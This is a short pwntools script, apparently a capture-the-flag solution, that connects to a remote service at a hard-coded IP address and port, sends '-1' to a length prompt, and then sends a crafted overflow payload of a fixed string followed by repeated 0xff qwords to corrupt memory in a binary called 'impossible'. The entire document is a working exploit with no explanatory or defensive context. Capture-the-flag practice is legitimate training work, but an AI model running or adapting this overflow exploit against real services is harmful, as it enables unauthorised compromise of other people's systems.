from pwn import *

#io = process('./impossible')
io = remote('178.128.19.56', 20000)
print(io.recv())
io.sendline('-1')
print(io.recv())
payload = b'CyberK1d' + 63 * p64(0xffffffffffffffff) + p32(0xffffffff) + p32(1)
io.sendline(payload)
print(io.recvall())
